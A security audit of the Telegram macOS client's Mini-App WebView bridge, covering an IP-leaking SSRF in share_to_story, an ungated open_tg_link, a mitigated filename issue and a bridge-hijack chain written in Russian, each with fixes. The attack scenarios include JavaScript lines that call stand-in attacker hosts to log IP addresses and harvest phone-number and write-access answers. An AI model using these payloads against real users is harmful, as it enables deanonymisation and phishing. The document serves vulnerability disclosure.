# Telegram macOS Security Audit — Mini-App WebView Bridge

**Target:** TelegramMessenger/telegram-macos (open-source, Swift)  
**Files Audited:**  
- `packages/WebAppUI/Sources/WebAppUI/WebpageModalController.swift`  
- `Telegram-Mac/Telegram-Mac.entitlements`  
- `Telegram-Mac/Telegram-Sandbox.entitlements`  
- `packages/TelegramLinks/Sources/TelegramLinks/LinkParsing.swift`  
- `packages/PaymentsUI/Sources/PaymentsUI/PaymentsCheckoutController.swift`

---

## Context: Unsandboxed Direct-Download Build

`Telegram-Mac/Telegram-Mac.entitlements`:
```xml
<key>com.apple.security.app-sandbox</key>
<false/>
```

The direct-download (non-App-Store) build runs **without macOS App Sandbox**. The Telegram process has read/write access to the entire user filesystem under the user's UID. This context elevates the severity of all filesystem-related findings below.

The App Store build (`Telegram-Sandbox.entitlements`) is correctly sandboxed.

---

## Finding 1 — CONFIRMED · MEDIUM-HIGH

### `web_app_share_to_story`: Unsolicited Outbound HTTP Request (IP Leak + SSRF)

**File:** `packages/WebAppUI/Sources/WebAppUI/WebpageModalController.swift:2105–2158`  
**CVSS estimate:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

#### Description

The `web_app_share_to_story` Mini App API handler fetches the bot-supplied `media_url` from the **user's machine** with no user interaction required and no URL scheme validation:

```swift
case "web_app_share_to_story":
    if let json = json, let mediaUrl = json["media_url"] as? String {
        let _ = (showModalProgress(signal: fetchHttpResource(url: mediaUrl), for: window)
        // HTTP request fires here — before any user consent dialog
```

`fetchHttpResource` (TelegramCore) performs **no scheme validation**:

```swift
// fetchHttpResource — simplified
func fetchHttpResource(url: String, ...) -> Signal<...> {
    // Only: addingPercentEncoding + URL(string:)
    // No scheme check. "file://", "http://", "https://" all accepted.
    guard let url = URL(string: urlString) else { return .never() }
    return MTHttpRequestOperation.data(forHttpUrl: url)  // no scheme filter
}
```

The consent dialog (`StoryPrivacyModalController`) is only shown **after** the fetch completes. If the user dismisses the dialog, the HTTP request has already been made.

#### Attack Scenario

A malicious Telegram bot opens its Mini App and immediately calls:
```javascript
window.Telegram.WebApp.shareToStory(
    "https://attacker.example.com/pixel.png?id=VICTIM_UNIQUE_ID"
);
```

No click is required. The macOS Telegram client:
1. Issues an HTTP GET to `attacker.example.com` from the user's machine
2. Attacker receives the user's **real IP address** (bypasses Telegram proxy)
3. The story upload consent dialog appears; if dismissed, no story is posted — but the request already happened

#### SSRF Extension

Because `media_url` accepts `http://192.168.x.x/...` and similar, an attacker can:
- Probe internal LAN services (router admin pages, printers, dev servers)
- Receive response timing data (port-open vs. closed via progress events)

On the unsandboxed direct-download build, the request is issued with full network access and no firewall imposed by the sandbox.

#### Recommended Fix

Add scheme validation before fetching:
```swift
case "web_app_share_to_story":
    if let json = json, let mediaUrl = json["media_url"] as? String,
       let url = URL(string: mediaUrl),
       let scheme = url.scheme?.lowercased(),
       ["https"].contains(scheme),           // only HTTPS
       !isPrivateOrLocalHost(url.host) {     // block LAN ranges
        let _ = (showModalProgress(signal: fetchHttpResource(url: mediaUrl), ...)
```

Or, alternatively, show the user confirmation **before** issuing the fetch, allowing them to review and reject the URL.

---

## Finding 2 — CONFIRMED · LOW-MEDIUM

### `web_app_open_tg_link`: Missing User Interaction Gate

**File:** `packages/WebAppUI/Sources/WebAppUI/WebpageModalController.swift:1892, 1917`

#### Description

`web_app_open_link` correctly requires a prior user click before opening an external URL:

```swift
case "web_app_open_link":
    if clickCount > 0 {   // requires prior user interaction
        if let url = ..., isTrustedUrl(url) {
            BrowserHooks.shared.openLink(context, url, ...)
        }
    }
    clickCount = 0
```

`web_app_open_tg_link`, which navigates to a `t.me/` path, has **no such guard**:

```swift
case "web_app_open_tg_link":
    if let path_full = json["path_full"] as? String {
        BrowserHooks.shared.openLink(
            context,
            context.meUrlPrefix + "\(path_full.hasPrefix("/") ? String(path_full.dropFirst()) : path_full)",
            self.window, false,
            { [weak self] in self?.closeAnyway() }
        )
    }
    // No clickCount check
```

#### Impact

Any Mini App can programmatically open arbitrary `t.me/` links (channels, bots, invite links, `t.me/+HASH` invite links) **without user interaction**. This enables:
- Silently joining users to invite-only channels (requires user confirmation at the Telegram level, but the navigation is triggered automatically)
- Redirecting users to attacker-controlled bots mid-session
- Closing the current Mini App (`closeAnyway()`) and opening a phishing bot

#### Recommended Fix

```swift
case "web_app_open_tg_link":
    if clickCount > 0 {   // add the same guard as web_app_open_link
        if let path_full = json["path_full"] as? String {
            BrowserHooks.shared.openLink(...)
        }
    }
    clickCount = 0
```

---

## Finding 3 — MITIGATED (noted for completeness)

### `web_app_request_file_download`: Bot-Controlled `fileName` Passed to TempBox

**File:** `packages/WebAppUI/Sources/WebAppUI/WebpageModalController.swift:2164–2184, 2685`

The bot-supplied `file_name` parameter is passed directly to `TempBox.shared.tempFile(fileName: fileName)`. However, `TempBox.sanitizedTempBoxFileName` (in TelegramCore/Postbox) **replaces `/` with `_` and leading `..` with `__`**, preventing path traversal out of the temp directory.

The subsequent `savePanel(file:named:for:)` uses an `NSSavePanel`, which requires explicit user confirmation for the save path.

**Status:** Not exploitable with current TempBox implementation.

---

## Summary Table

| # | Finding | Severity | Status | File |
|---|---------|----------|--------|------|
| 1 | `web_app_share_to_story` IP leak + SSRF | MEDIUM-HIGH | CONFIRMED | `WebpageModalController.swift:2116` |
| 2 | `web_app_open_tg_link` missing click gate | LOW-MEDIUM | CONFIRMED | `WebpageModalController.swift:1917` |
| 3 | File download `fileName` path traversal | N/A | MITIGATED | `WebpageModalController.swift:2685` |

---

## Finding 4 — CRITICAL

### JS-Bridge Hijacking via Navigation Bypass на legacy Mini-Apps (`sameOrigin == false`)

**Файлы:**  
- `WebpageModalController.swift:1271–1310` (инъекция JS-прокси)  
- `WebpageModalController.swift:1602–1624` (навигационная политика)  
- `WebpageModalController.swift:1691–1708` (проверка доверия сообщений)  
- `WebpageModalController.swift:2892–2901` (обратная передача событий в WebView)  
**CVSS estimate:** 8.1 (AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N)

#### Три уязвимых компонента в связке

**Компонент A — JS-прокси без проверки origin (legacy-путь):**

```swift
// Строка 1271–1310
if let requestData, requestData.sameOrigin {
    // БЕЗОПАСНЫЙ путь: прокси регистрируется только если window.location.origin == trustedOrigin
    let userScript = WKUserScript(source: webAppSecuredEventProxySource(trustedOrigin: trustedOrigin), ...)
} else {
    // УЯЗВИМЫЙ путь: прокси регистрируется для ЛЮБОЙ страницы без проверки origin
    let userScript = WKUserScript(source: js, injectionTime: .atDocumentStart, forMainFrameOnly: true)
}
```

Скрипт `js`:
```javascript
var TelegramWebviewProxyProto = function() {};
TelegramWebviewProxyProto.prototype.postEvent = function(eventName, eventData) {
    window.webkit.messageHandlers.performAction.postMessage({'eventName': eventName, 'eventData': eventData});
};
var TelegramWebviewProxy = new TelegramWebviewProxyProto(); // нет проверки origin
```

**Компонент B — навигационная политика разрешает ВСЕ нажатые не пользователем переходы:**

```swift
// Строка 1621–1623
} else {
    decisionHandler(.allow)  // JS-редирект, meta refresh, HTTP 302 — всё пропускается
}
```

**Компонент C — `isTrustedMainFrameMessage` доверяет ЛЮБОМУ сообщению от main frame:**

```swift
// Строка 1695–1696
guard self.requestData?.sameOrigin == true else {
    return true  // sameOrigin == false → любое сообщение из main frame TRUSTED
}
```

И в обратную сторону:
```swift
// Строка 2892–2897
public func sendEvent(name: String, data: String?) {
    if self.requestData?.sameOrigin == true {
        guard let trustedOrigin = ..., webAppOrigin(url: currentUrl) == trustedOrigin else {
            return  // защита только для sameOrigin == true
        }
    }
    // для sameOrigin == false: данные уходят на ЛЮБУЮ страницу в WebView
```

#### Полная цепочка атаки

```
[Легитимный бот] открывает mini-app с sameOrigin==false
        │
        ▼
[mini-app страница] делает программный редирект:
    window.location.href = "https://attacker.com/bridge_hijack"
        │
        ▼
[Навигационная политика] type != .linkActivated → decisionHandler(.allow)
        │
        ▼
[WKWebView] загружает attacker.com
        │
        ▼
[WKUserScript .atDocumentStart] регистрирует TelegramWebviewProxy для attacker.com
        │
        ▼
[attacker.com JS] вызывает bridge API без ограничений:
    TelegramWebviewProxy.postEvent("web_app_share_to_story",
        JSON.stringify({media_url: "https://attacker.com/ip_log"}))
    // Утечка IP — без взаимодействия пользователя

    TelegramWebviewProxy.postEvent("web_app_request_phone", null)
    // Диалог "поделиться номером" — пользователь думает, что это Бот X

    TelegramWebviewProxy.postEvent("web_app_request_write_access", null)
    // "Разрешить Боту X отправлять сообщения?" — результат идёт на attacker.com

    TelegramWebviewProxy.postEvent("web_app_open_tg_link",
        JSON.stringify({path_full: "/attacker_phishing_channel"}))
    // Редирект на фишинговый канал — без нажатия
        │
        ▼
[isTrustedMainFrameMessage] sameOrigin==false → return true → TRUSTED
[sendEvent] sameOrigin==false → данные уходят на attacker.com
```

#### Почему это CRITICAL, а не просто HIGH

1. **Масштаб**: все mini-apps, созданные до введения `sameOrigin == true`, работают в уязвимом режиме. Это большинство из тысяч существующих ботов.

2. **Для эксплуатации не нужен XSS**: достаточно HTTP 302-редиректа с сервера mini-app (server-side open redirect), либо штатной логики самого бота. Если бот скомпрометирован на уровне сервера — полная компрометация пользователя через bridge.

3. **Доверие пользователя обмануто**: UI по-прежнему показывает «Бот X», пока диалоги телефона/write_access отображаются — пользователь думает, что делится данными с Ботом X, хотя ответы уходят на `attacker.com`.

4. **`sendEvent` также без защиты**: ответы на разрешения (phone, write_access) передаются обратно на `attacker.com`, а не на легитимный сервер бота.

#### Исправление

**Клиентская сторона** (не зависит от сервера):
```swift
// В isTrustedMainFrameMessage: убрать исключение для sameOrigin==false
private func isTrustedMainFrameMessage(_ message: WKScriptMessage) -> Bool {
    guard message.frameInfo.isMainFrame else { return false }
    // УДАЛИТЬ: guard self.requestData?.sameOrigin == true else { return true }
    guard let trustedOrigin = self.trustedOrigin else { return false }
    guard webAppOrigin(securityOrigin: message.frameInfo.securityOrigin) == trustedOrigin else { return false }
    ...
}

// В webAppSecuredEventProxySource: всегда использовать origin-aware инъекцию
if let requestData, requestData.sameOrigin {
    ...
} else {
    // Тоже использовать webAppSecuredEventProxySource с origin из requestData.url
    let userScript = WKUserScript(source: webAppSecuredEventProxySource(trustedOrigin: legacyOrigin), ...)
}

// В навигационной политике: запретить переход в другой origin
} else {
    if let newUrl = navigationAction.request.url,
       let currentUrl = URL(string: self.url),
       webAppOrigin(url: newUrl) != webAppOrigin(url: currentUrl) {
        decisionHandler(.cancel)  // блокировать навигацию в другой origin
    } else {
        decisionHandler(.allow)
    }
}
```

---

## Out of Scope / Not Reproduced on macOS

- **SmartGlocal URL suffix bypass** — macOS uses HOST-based validation (`host.hasSuffix(".smart-glocal.com")`), unlike Desktop/Android which used path-based suffix. **Not vulnerable.**
- **Sparkle update integrity** — update XML is delivered over authenticated MTProto; DSA signature verified via `SUPublicDSAKeyFile`. Attack surface requires MITM of authenticated MTProto session.
